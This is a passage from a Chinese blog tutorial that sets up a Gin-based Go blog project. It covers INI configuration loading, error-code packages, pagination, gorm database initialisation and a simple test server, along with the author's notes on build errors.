id="2-编写项目配置包"><a href="#2-编写项目配置包" class="headerlink" title="2.编写项目配置包"></a>2.编写项目配置包</h2><h3 id="下载依赖包go-ini-ini"><a href="#下载依赖包go-ini-ini" class="headerlink" title="下载依赖包go-ini/ini"></a>下载依赖包<a href="https://github.com/go-ini/ini" target="_blank" rel="noopener">go-ini/ini</a></h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get -u  github.com/<span class="keyword">go</span>-ini/ini</span><br></pre></td></tr></table></figure></div><h3 id="在gin-blog的conf目录下创建app-ini文件"><a href="#在gin-blog的conf目录下创建app-ini文件" class="headerlink" title="在gin-blog的conf目录下创建app.ini文件"></a>在gin-blog的conf目录下创建app.ini文件</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#debug or release</span><br><span class="line">RUN_MODE = debug</span><br><span class="line"></span><br><span class="line">[app]</span><br><span class="line">PAGE_SIZE = 10</span><br><span class="line">JWT_SECRET = 23347$040412</span><br><span class="line"></span><br><span class="line">[server]</span><br><span class="line">HTTP_PORT = 8000</span><br><span class="line">READ_TIMEOUT = 60</span><br><span class="line">WRITE_TIMEOUT = 60</span><br><span class="line"></span><br><span class="line">[database]</span><br><span class="line">TYPE = mysql</span><br><span class="line">USER = 数据库账号</span><br><span class="line">PASSWORD = 数据库密码</span><br><span class="line">#127.0.0.1:3306</span><br><span class="line">HOST = 数据库IP:数据库端口号</span><br><span class="line">NAME = blog</span><br><span class="line">TABLE_PREFIX = blog_</span><br></pre></td></tr></table></figure></div><h3 id="建立配置setting模块，在pkg目录下创建setting目录，并且创建setting-go文件。"><a href="#建立配置setting模块，在pkg目录下创建setting目录，并且创建setting-go文件。" class="headerlink" title="建立配置setting模块，在pkg目录下创建setting目录，并且创建setting.go文件。"></a>建立配置setting模块，在pkg目录下创建setting目录，并且创建setting.go文件。</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> setting</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"time"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"github.com/go-ini/ini"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">config *ini.File</span><br><span class="line">RunModel <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">Httpport <span class="keyword">int</span></span><br><span class="line">ReadTimeOut time.Duration</span><br><span class="line">WriteTimeOut time.Duration</span><br><span class="line"></span><br><span class="line">Pagesize <span class="keyword">int</span></span><br><span class="line">Jwtsecret <span class="keyword">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">config, err = ini.Load(<span class="string">"conf/app.ini"</span>) </span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">"Fail to read file: %v"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">LoadBase()</span><br><span class="line">LoadServer()</span><br><span class="line">LoadApp()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LoadBase</span><span class="params">()</span></span> &#123;</span><br><span class="line">RunModel = config.Section(<span class="string">""</span>).Key(<span class="string">"RUN_MODE"</span>).MustString(<span class="string">"debug"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LoadServer</span><span class="params">()</span></span> &#123;</span><br><span class="line">ser, err := config.GetSection(<span class="string">"server"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">"Fail to get selection %v"</span>,err)</span><br><span class="line">&#125;</span><br><span class="line">RunModel = config.Section(<span class="string">""</span>).Key(<span class="string">"RUN_MODE"</span>).MustString(<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">Httpport = ser.Key(<span class="string">"HTTP_PORT"</span>).MustInt(<span class="number">8000</span>)</span><br><span class="line">ReadTimeOut = time.Duration(ser.Key(<span class="string">"READ_TIMEOUT"</span>).MustInt(<span class="number">60</span>)) * time.Second</span><br><span class="line">WriteTimeOut = time.Duration(ser.Key(<span class="string">"WRITE_TIMEOUT"</span>).MustInt(<span class="number">60</span>)) * time.Second</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">LoadApp</span><span class="params">()</span></span> &#123;</span><br><span class="line">App, err := config.GetSection(<span class="string">"app"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">"Fail to get selection %v"</span>,err)</span><br><span class="line">&#125;</span><br><span class="line">Pagesize = App.Key(<span class="string">"PAGE_SIZE"</span>).MustInt(<span class="number">10</span>)</span><br><span class="line">Jwtsecret = App.Key(<span class="string">"JWT_SECRET"</span>).MustString(<span class="string">"!@)*#)!@U#@*!@!)"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="目录树"><a href="#目录树" class="headerlink" title="目录树"></a>目录树</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─gin-blog</span><br><span class="line">    │  test.go</span><br><span class="line">    │</span><br><span class="line">    ├─conf</span><br><span class="line">    │      app.ini</span><br><span class="line">    │</span><br><span class="line">    ├─middleware</span><br><span class="line">    ├─models</span><br><span class="line">    ├─pkg</span><br><span class="line">    │      setting.go</span><br><span class="line">    │</span><br><span class="line">    ├─routers</span><br><span class="line">    └─runtime</span><br></pre></td></tr></table></figure></div><h2 id="编写API错误码包"><a href="#编写API错误码包" class="headerlink" title="编写API错误码包"></a>编写API错误码包</h2><h4 id="建立错误码包的e模块，在gin-blog中的pkg目录下创建e目录，在下创建code-go和msg-go文件。"><a href="#建立错误码包的e模块，在gin-blog中的pkg目录下创建e目录，在下创建code-go和msg-go文件。" class="headerlink" title="建立错误码包的e模块，在gin-blog中的pkg目录下创建e目录，在下创建code.go和msg.go文件。"></a>建立错误码包的e模块，在gin-blog中的pkg目录下创建e目录，在下创建code.go和msg.go文件。</h4><h4 id="1-code-go"><a href="#1-code-go" class="headerlink" title="1.code.go"></a>1.code.go</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">SUCCESS = <span class="number">200</span></span><br><span class="line">ERROR = <span class="number">500</span></span><br><span class="line">INVALID_PARAMS = <span class="number">400</span></span><br><span class="line"></span><br><span class="line">ERROR_EXIST_TAG = <span class="number">10001</span></span><br><span class="line">ERROR_NOT_EXIST_TAG = <span class="number">10002</span></span><br><span class="line">ERROR_NOT_EXIST_ARTICLE = <span class="number">10003</span></span><br><span class="line"></span><br><span class="line">ERROR_AUTH_CHECK_TOKEN_FAIL = <span class="number">20001</span></span><br><span class="line">ERROR_AUTH_CHECK_TOKEN_TIMEOUT = <span class="number">20002</span></span><br><span class="line">ERROR_AUTH_TOKEN = <span class="number">20003</span></span><br><span class="line">ERROR_AUTH = <span class="number">20004</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div><h4 id="2-msg-go"><a href="#2-msg-go" class="headerlink" title="2.msg.go"></a>2.msg.go</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> MsgFlags = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span> &#123;</span><br><span class="line">SUCCESS : <span class="string">"ok"</span>,</span><br><span class="line">ERROR : <span class="string">"fail"</span>,</span><br><span class="line">INVALID_PARAMS : <span class="string">"请求参数错误！"</span>,</span><br><span class="line">ERROR_EXIST_TAG : <span class="string">"已存在该标签名称"</span>,</span><br><span class="line">ERROR_NOT_EXIST_TAG : <span class="string">"该标签不存在"</span>,</span><br><span class="line">ERROR_NOT_EXIST_ARTICLE : <span class="string">"该文章不存在"</span>,</span><br><span class="line">ERROR_AUTH_CHECK_TOKEN_FAIL : <span class="string">"Token鉴权失败"</span>,</span><br><span class="line">ERROR_AUTH_CHECK_TOKEN_TIMEOUT : <span class="string">"Token已超时"</span>,</span><br><span class="line">ERROR_AUTH_TOKEN : <span class="string">"Token生成失败"</span>,</span><br><span class="line">ERROR_AUTH : <span class="string">"Token错误"</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetMsg</span><span class="params">(code <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">msg, ok := MsgFlags[code]</span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line"><span class="keyword">return</span> msg</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> MsgFlags[ERROR]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="编写工具包"><a href="#编写工具包" class="headerlink" title="编写工具包"></a>编写工具包</h2><h4 id="拉取依赖包com。"><a href="#拉取依赖包com。" class="headerlink" title="拉取依赖包com。"></a>拉取依赖包<a href="github.com/Unknwon/com">com</a>。</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get -u github.com/Unknwon/com</span><br></pre></td></tr></table></figure></div><h3 id="编写分页页码的获取方法"><a href="#编写分页页码的获取方法" class="headerlink" title="编写分页页码的获取方法"></a>编写分页页码的获取方法</h3><h4 id="在gin-blog的pkg目录下，新建util目录。在util目录下创建pagination-go"><a href="#在gin-blog的pkg目录下，新建util目录。在util目录下创建pagination-go" class="headerlink" title="在gin-blog的pkg目录下，新建util目录。在util目录下创建pagination.go"></a>在gin-blog的pkg目录下，新建util目录。在util目录下创建pagination.go</h4><h4 id="pagination-go"><a href="#pagination-go" class="headerlink" title="pagination.go"></a>pagination.go</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> util</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line"><span class="string">"github.com/Unknwon/com"</span></span><br><span class="line"><span class="string">"gin-blog/pkg/setting"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Getpag</span><span class="params">(c *gin.Context)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">result := <span class="number">0</span></span><br><span class="line">page,_ := com.StrTo(c.Query(<span class="string">"page"</span>)).Int()</span><br><span class="line"><span class="keyword">if</span> page &gt; <span class="number">0</span> &#123;</span><br><span class="line">result = (page - <span class="number">1</span>) * setting.PageSize</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://postimg.cc/QHT8wVqB" target="_blank" rel="noopener">error.png</a><br><a href="https://postimg.cc/QHT8wVqB" target="_blank" rel="noopener"><img src="https://i.postimg.cc/DyCSWXJc/error.png" alt="error.png"></a></p><h4 id="根据可以看出，我们的目录错了。应该在src中创建gin-blog。可以去看看GO的工作区的使用应该可以明白。"><a href="#根据可以看出，我们的目录错了。应该在src中创建gin-blog。可以去看看GO的工作区的使用应该可以明白。" class="headerlink" title="根据可以看出，我们的目录错了。应该在src中创建gin-blog。可以去看看GO的工作区的使用应该可以明白。"></a>根据可以看出，我们的目录错了。应该在src中创建gin-blog。可以去看看GO的工作区的使用应该可以明白。</h4><h3 id="编写models-init"><a href="#编写models-init" class="headerlink" title="编写models init"></a>编写models init</h3><h4 id="拉取gorm依赖包。gorm文档"><a href="#拉取gorm依赖包。gorm文档" class="headerlink" title="拉取gorm依赖包。gorm文档"></a>拉取<a href="github.com/jinzhu/gorm">gorm</a>依赖包。<a href="http://gorm.book.jasperxu.com" target="_blank" rel="noopener">gorm文档</a></h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get -u github.com/jinzhu/gorm</span><br></pre></td></tr></table></figure></div><h4 id="拉取mysql驱动依赖包。"><a href="#拉取mysql驱动依赖包。" class="headerlink" title="拉取mysql驱动依赖包。"></a>拉取<a href="github.com/go-sql-driver/mysql">mysql</a>驱动依赖包。</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get -u github.com/<span class="keyword">go</span>-sql-driver/mysql</span><br></pre></td></tr></table></figure></div><h4 id="在gin-blog的models目录下新建models-go，用于models的初始化使用"><a href="#在gin-blog的models目录下新建models-go，用于models的初始化使用" class="headerlink" title="在gin-blog的models目录下新建models.go，用于models的初始化使用."></a>在gin-blog的models目录下新建models.go，用于models的初始化使用.</h4><h4 id="models-go"><a href="#models-go" class="headerlink" title="models.go"></a>models.go</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/jinzhu/gorm"</span></span><br><span class="line">_ <span class="string">"github.com/jinzhu/gorm/dialects/mysql"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"gin-blog/pkg/setting"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Model <span class="keyword">struct</span> &#123;</span><br><span class="line">ID <span class="keyword">int</span> <span class="string">`gorm:"primary_key" json:"id"`</span></span><br><span class="line">CreatedOn <span class="keyword">int</span> <span class="string">`json:"created_on"`</span></span><br><span class="line">ModifiedOn <span class="keyword">int</span> <span class="string">`json:"modified_on"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">err error</span><br><span class="line">dbType, dbName, user, password, host, tablePrefix <span class="keyword">string</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// ser,err := setting.config.GetSection("database")</span></span><br><span class="line">ser, err := setting.config.GetSection(<span class="string">"database"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">"Fail get selection %v"</span>,err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dbType = ser.Key(<span class="string">"TYPE"</span>).String()</span><br><span class="line">dbName = ser.Key(<span class="string">"NAME"</span>).String()</span><br><span class="line">user = ser.Key(<span class="string">"USER"</span>).String()</span><br><span class="line">password = ser.Key(<span class="string">"PASSWORD"</span>).String()</span><br><span class="line">host = ser.Key(<span class="string">"HOST"</span>).String()</span><br><span class="line">tablePrefix = ser.Key(<span class="string">"TABLE_PREFIX"</span>).String()</span><br><span class="line"></span><br><span class="line">db, err = gorm.Open(dbType, fmt.Sprintf(<span class="string">"%s:%s@tcp(%s)/%s?charset=utf8&amp;parseTime=True&amp;loc=Local"</span>, user, password, host, dbName))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">gorm.DefaultTableNameHandler = <span class="function"><span class="keyword">func</span> <span class="params">(db *gorm.DB, defaultTableName <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> tablePrefix + defaultTableName;</span><br><span class="line">&#125;</span><br><span class="line">db.SingularTable(<span class="literal">true</span>)</span><br><span class="line">db.DB().SetMaxIdleConns(<span class="number">10</span>)</span><br><span class="line">db.DB().SetMaxOpenConns(<span class="number">100</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CloseDB</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> db.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://postimg.cc/75S3Ngtm" target="_blank" rel="noopener">error1.png</a><br><a href="https://postimg.cc/75S3Ngtm" target="_blank" rel="noopener"><img src="https://i.postimg.cc/g2TgmsVF/error1.png" alt="error1.png"></a></p><h4 id="出现问题。和之前的一样，但是目前的目录已经迁移到src-gin-blog。"><a href="#出现问题。和之前的一样，但是目前的目录已经迁移到src-gin-blog。" class="headerlink" title="出现问题。和之前的一样，但是目前的目录已经迁移到src/gin-blog。"></a>出现问题。和之前的一样，但是目前的目录已经迁移到src/gin-blog。</h4><h2 id="编写项目启动，路由文件。"><a href="#编写项目启动，路由文件。" class="headerlink" title="编写项目启动，路由文件。"></a>编写项目启动，路由文件。</h2><h3 id="编写demo"><a href="#编写demo" class="headerlink" title="编写demo"></a>编写demo</h3><h4 id="在gin-blog的目录下创建main-go为启动文件。"><a href="#在gin-blog的目录下创建main-go为启动文件。" class="headerlink" title="在gin-blog的目录下创建main.go为启动文件。"></a>在gin-blog的目录下创建main.go为启动文件。</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"gin-blog/pkg/setting"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"github.com/gin-gonic/gin"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">router := gin.Default()</span><br><span class="line">router.GET(<span class="string">"/test"</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line"><span class="string">"message"</span>: <span class="string">"test"</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">s := &amp;http.Server&#123;</span><br><span class="line">Addr:           fmt.Sprintf(<span class="string">":%d"</span>, setting.Httpport),</span><br><span class="line">Handler:        router,</span><br><span class="line">ReadTimeout:    setting.ReadTimeOut,</span><br><span class="line">WriteTimeout:   setting.WriteTimeOut,</span><br><span class="line">MaxHeaderBytes: <span class="number">1</span> &lt;&lt; <span class="number">20</span>,</span><br><span class="line">&#125;</span><br><span class="line">s.ListenAndServe()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li><h5 id="Addr：监听的TCP地址，格式为-8000"><a href="#Addr：监听的TCP地址，格式为-8000" class="headerlink" title="Addr：监听的TCP地址，格式为:8000"></a>Addr：监听的TCP地址，格式为:8000</h5></li><li><h5 id="Handler：http句柄，实质为ServeHTTP，用于处理程序响应HTTP请求"><a href="#Handler：http句柄，实质为ServeHTTP，用于处理程序响应HTTP请求" class="headerlink" title="Handler：http句柄，实质为ServeHTTP，用于处理程序响应HTTP请求"></a>Handler：http句柄，实质为ServeHTTP，用于处理程序响应HTTP请求</h5></li><li><h5 id="TLSConfig：安全传输层协议（TLS）的配置"><a href="#TLSConfig：安全传输层协议（TLS）的配置" class="headerlink" title="TLSConfig：安全传输层协议（TLS）的配置"></a>TLSConfig：安全传输层协议（TLS）的配置</h5></li><li><h5 id="ReadTimeout：允许读取的最大时间"><a href="#ReadTimeout：允许读取的最大时间" class="headerlink" title="ReadTimeout：允许读取的最大时间"></a>ReadTimeout：允许读取的最大时间</h5></li><li><h5 id="ReadHeaderTimeout：允许读取请求头的最大时间"><a href="#ReadHeaderTimeout：允许读取请求头的最大时间" class="headerlink" title="ReadHeaderTimeout：允许读取请求头的最大时间"></a>ReadHeaderTimeout：允许读取请求头的最大时间</h5></li><li><h5 id="WriteTimeout：允许写入的最大时间"><a href="#WriteTimeout：允许写入的最大时间" class="headerlink" title="WriteTimeout：允许写入的最大时间"></a>WriteTimeout：允许写入的最大时间</h5></li><li><h5 id="IdleTimeout：等待的最大时间"><a href="#IdleTimeout：等待的最大时间" class="headerlink" title="IdleTimeout：等待的最大时间"></a>IdleTimeout：等待的最大时间</h5></li><li><h5 id="MaxHeaderBytes：请求头的最大字节数"><a href="#MaxHeaderBytes：请求头的最大字节数" class="headerlink" title="MaxHeaderBytes：请求头的最大字节数"></a>MaxHeaderBytes：请求头的最大字节数</h5></li><li><h5 id="ConnState：指定一个可选的回调函数，当客户端连接发生变化时调用"><a href="#ConnState：指定一个可选的回调函数，当客户端连接发生变化时调用" class="headerlink" title="ConnState：指定一个可选的回调函数，当客户端连接发生变化时调用"></a>ConnState：指定一个可选的回调函数，当客户端连接发生变化时调用</h5></li><li><h5 id="ErrorLog：指定一个可选的日志记录器，用于接收程序的意外行为和底层系统错误；如果未设置或为nil则默认以日志包的标准日志记录器完成（也就是在控制台输出）"><a href="#ErrorLog：指定一个可选的日志记录器，用于接收程序的意外行为和底层系统错误；如果未设置或为nil则默认以日志包的标准日志记录器完成（也就是在控制台输出）" class="headerlink" title="ErrorLog：指定一个可选的日志记录器，用于接收程序的意外行为和底层系统错误；如果未设置或为nil则默认以日志包的标准日志记录器完成（也就是在控制台输出）"></a>ErrorLog：指定一个可选的日志记录器，用于接收程序的意外行为和底层系统错误；如果未设置或为nil则默认以日志包的标准日志记录器完成（也就是在控制台输出）</h5><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> run main.<span class="keyword">go</span></span><br><span class="line">curl <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8000</span>/test</span><br><span class="line">&#123;<span class="string">"message"</span>:<span class="string">"test"</span>&#125;</span><br></pre></td></tr></table></figure></div></li></ul><h3 id="修改路由规则"><a href="#修改路由规则" class="headerlink" title="修改路由规则"></a>修改路由规则</h3><h4 id="在routers目录下创建router-go"><a href="#在routers目录下创建router-go" class="headerlink" title="在routers目录下创建router.go"></a>在routers目录下创建router.go</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 